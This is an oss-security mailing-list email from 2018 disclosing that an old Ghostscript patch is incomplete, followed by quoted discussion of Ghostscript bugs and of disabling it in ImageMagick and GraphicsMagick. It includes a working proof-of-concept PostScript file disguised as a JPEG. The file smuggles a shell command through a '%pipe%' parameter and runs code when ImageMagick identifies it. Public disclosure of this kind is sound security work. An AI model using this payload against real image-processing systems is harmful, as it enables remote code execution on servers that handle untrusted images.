X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4138" "Wednesday" "22" "August" "2018" "21:09:12" "+0300" "AmitB" "me@amitbl.com" "<CAOVKCF0Qehz2q3m2vPSAr3vKRAxdHrTbnyk71ApFYnVXuZ-P6Q@mail.gmail.com>" "110" "Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" "^Date:" nil nil "8" "2018082218:09:12" "[oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" (number mark "        me@amitbl.co Aug 22  110/4138  " thread-indent "\"Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?\"\n") "<CAJ_zFkJpnGtG6D3JZVaC5KJiNzsJ6vjJK0oXRfirR8QsdFbZVQ@mail.gmail.com>" ("<CAJ_zFk+ZNi8r8TKTZuaYgSBUz4mxCO7C5SC=B8Ktc_CZQW6Dsw@mail.gmail.com>" "<CAJ_zFk+RtYrqWQ4Mj1SLVJ7BTZBHLjo_M9t-gDVS_uDEPhuCrg@mail.gmail.com>" "<alpine.GSO.2.20.1808210951110.18862@scrappy.simplesystems.org>" "<CAFRnB2U+QMGmAMoZqbCgTjEx_o_NA+Y9eBE6eDBgJJ0hZdQ4GQ@mail.gmail.com>" "<CAJ_zFkJpnGtG6D3JZVaC5KJiNzsJ6vjJK0oXRfirR8QsdFbZVQ@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 14012 invoked by uid 550); 22 Aug 2018 19:27:09 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 11773 invoked from network); 22 Aug 2018 18:09:25 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=amitbl-com.20150623.gappssmtp.com; s=20150623;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to;
        bh=ga6JApaKfvXjYtybU+75Pon5K6gr4rf04+gyXemRAOg=;
        b=TxPQJUXKAyW1BwowDqTzL68qiOIRqV7OH7r2Dyt5fg681x4WsSKtGYU+NHCblGch+2
         TOhPWUeIVXuSqRbAjFCWkHaLYjotCsfrErPzYIE/u4O2f1TzgF+8gQScGp5ifJe+DGr8
         02MkvXoATIbBw9ACQ3xf/ECrA62vp5wKKbY6+YGcKGN91znz8bIkKRSZ3/9xOgK1EOXm
         ISqxB7Q9/jdSKDaC57xKqMSsxrgRw+UHRSGKn5WUMo9+s95Wa3me54u/aX06MOyLqXlo
         /q13s1cXk8D3ZJ6SxWYIFjXsBGnZWHMgfGIkUcHdA26LJ0hcrvcnJJaoryId3GJn0qvm
         puiA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to;
        bh=ga6JApaKfvXjYtybU+75Pon5K6gr4rf04+gyXemRAOg=;
        b=n5AOW504YcKn1qMnUTDypVZ0WpGgaOqjILZ/q1o7RjsqK35I3YFn/IHkh9hhAxcLZs
         xa7yQQxI8AJlYAcYhvSqy8bcvFC3lH33fjzXP2kBBP5kYI/+N8fyVGZ+sC1mcqRGdiNS
         NKLoyCdwUJn0iMwsj/LsGa5c+uNYNaxM4JeVS9bZBdqCYnuV9d0ulhzgoK8mymlRA8D4
         azTX3PXm1htXsCaYvPyW8Gss8T+CEtNcqWNODhdDfT3PjU2PrBAcV+sDcN/1gZczsH3k
         P7zk+AuRWc78eSd3zaKhsHm5wBeFqmCtH+J8xfTublgxkiY1aHpn1w57NQiKf7xTqARZ
         axtQ==
X-Gm-Message-State: APzg51DTvgegXyuPdycxgLFLk9Sw5jBTKIIukoxuYWoZvq7HFisrJLQs
	+bT2LumgZGVfq5Jb6id7qY8OnqUMBZiWvjUcUt+jp+b+Yc4=
X-Google-Smtp-Source: ANB0VdZCoH6Q5Ku23jIlDtpI9HJFR7/JCym+3CUn1f3ZFILoMvgrKnw2tPtaEmqTmGSiqXosjk9i3P+bHB9o6DEHKN4=
X-Received: by 2002:a24:8dc6:: with SMTP id w189-v6mr4329054itd.69.1534961352997;
 Wed, 22 Aug 2018 11:09:12 -0700 (PDT)
MIME-Version: 1.0
X-Originating-IP: [77.139.73.193]
In-Reply-To: <CAJ_zFkJpnGtG6D3JZVaC5KJiNzsJ6vjJK0oXRfirR8QsdFbZVQ@mail.gmail.com>
References: <CAJ_zFk+ZNi8r8TKTZuaYgSBUz4mxCO7C5SC=B8Ktc_CZQW6Dsw@mail.gmail.com>
 <CAJ_zFk+RtYrqWQ4Mj1SLVJ7BTZBHLjo_M9t-gDVS_uDEPhuCrg@mail.gmail.com>
 <alpine.GSO.2.20.1808210951110.18862@scrappy.simplesystems.org>
 <CAFRnB2U+QMGmAMoZqbCgTjEx_o_NA+Y9eBE6eDBgJJ0hZdQ4GQ@mail.gmail.com> <CAJ_zFkJpnGtG6D3JZVaC5KJiNzsJ6vjJK0oXRfirR8QsdFbZVQ@mail.gmail.com>
Message-ID: <CAOVKCF0Qehz2q3m2vPSAr3vKRAxdHrTbnyk71ApFYnVXuZ-P6Q@mail.gmail.com>
Content-Type: multipart/alternative; boundary="00000000000030943005740a0a15"
Date: Wed, 22 Aug 2018 21:09:12 +0300
From: AmitB <me@amitbl.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS
 coders in policy.xml by default?
To: oss-security@lists.openwall.com

--00000000000030943005740a0a15
Content-Type: text/plain; charset="UTF-8"

I also took a look a copule weeks ago at few of the patches for your
previous bugs from 2 years ago, and found that one of them is incomplete
and still allowing RCE (https://bugs.ghostscript.com/show_bug.cgi?id=697178)

POC:
------------------
$ cat poc.jpg
%!PS
<< (ICCProfilesDir) (%pipe%id > /dev/) >> .setuserparams
currentdevice null true mark /OutputICCProfile (tty)
.putdeviceparams
showpage
$ identify poc.jpg
uid=1000(amit) gid=1000(amit) groups=1000(amit)

After reviewing all of the comments in the original bug report I saw that
you actually mentioned this issue, but it was not taken under
consideration/forgotten for some reason.
So effectively a public RCE PoC has been avaliable for GhostScript for
almost 2 years.

I opened a report two weeks ago at bugs.ghostscript.com:
699623 Incomplete fix for #697178 Allowing -dSAFER bypass

But I got no response from them until today.
If you have others channels of contact with them please let them know about
this one too.

On Tue, Aug 21, 2018 at 11:12 PM, Tavis Ormandy <taviso@google.com> wrote:

> Thanks Alex.
>
> FWIW, not all of these are visible, but I've started filing bugs, I'll file
> a few more today and then let the developers work through the most serious
> ones.
>
> 699654 /invalidaccess checks stop working after a failed restore
> 699655 missing type checking in setcolor
> 699656 LockDistillerParams boolean missing type checks
> 699659 missing type check in type checker (!)
> 699657 .tempfile SAFER restrictions seem to be broken
> 699658 Bypassing PermitFileReading by handling undefinedfilename error
> 699660 shading_param incomplete type checking
> 699661 pdf14 garbage collection memory corruption
> 699662 calling .bindnow causes sideeffects
> 699663 .setdistillerkeys memory corruption
> 699664 corrupt device object after error in job
>
> I'm working on getting reproducers working for the developers for all bugs.
>
> On Tue, Aug 21, 2018 at 8:22 AM Alex Gaynor <alex.gaynor@gmail.com> wrote:
>
> > A small note. Both ImageMagick and GraphicsMagick process various file
> > formats that can nest a different image file inside of them. These are
> very
> > frequently implemented with a call to ReadImage(), with no checking that
> > it's the expected file format. (As a result, the fuzzer finds various
> > impressive chains, with sometimes 3 different image formats nested inside
> > of each other).
> >
> > The conclusion of this is that people _must not_ attempt to do their own
> > format detection and then pass the data to IM/GM, because this can be
> > bypassed with nested formats. It's imperative that GS truly be disabled
> > with either policy.xml or by uninstall GS.
> >
> > Alex
> >
> > On Tue, Aug 21, 2018 at 11:01 AM Bob Friesenhahn <
> > bfriesen@simple.dallas.tx.us> wrote:
> >
> > > On Tue, 21 Aug 2018, Tavis Ormandy wrote:
> > > >
> > > > I think those thumbnails should be disabled, but you've probably
> > noticed
> > > I
> > > > think everything related to untrusted ghostscript should be disabled
> > :-)
> > >
> > > I have posted to the GraphicsMagick Announcements mailing list
> > > regarding your findings (with a link to this list) and suggested that
> > > a fool-proof solution is that Ghostscript should be uninstalled.
> > >
> > > Uninstalling Ghostscript entirely might cause software using libgs to
> > > not execute at all unless a stub library is put in its place.
> > >
> > > Dependencies on Ghostscript are much larger than one would initially
> > > think due to Postscript being the traditional output from Unix
> > > software for "printing" and thus it is used as an intermediate format
> > > in order to convert between formats.  EPS content is also embedded in
> > > some other formats.
> > >
> > > Bob
> > > --
> > > Bob Friesenhahn
> > > bfriesen@simple.dallas.tx.us,
> > http://www.simplesystems.org/users/bfriesen/
> > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
> > >
> >
> >
> > --
> > All that is necessary for evil to succeed is for good people to do
> nothing.
> >
>

--00000000000030943005740a0a15--
